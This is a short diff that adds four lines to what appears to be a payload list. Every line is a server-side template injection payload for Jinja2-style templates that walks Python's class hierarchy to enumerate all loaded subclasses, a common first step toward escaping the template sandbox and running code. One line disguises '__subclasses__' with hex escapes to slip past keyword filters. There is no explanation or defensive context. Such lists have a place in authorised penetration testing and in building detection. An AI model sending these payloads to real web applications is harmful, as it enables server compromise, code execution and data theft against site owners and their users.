@@ -1,0 +1,4 @@
+{{ dict.__base__.__subclasses__() }}
+{{ dict.mro()[-1].__subclasses__() }}
+{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}
+{{( ''.__class__).__mro__[1].__subclasses__() }}
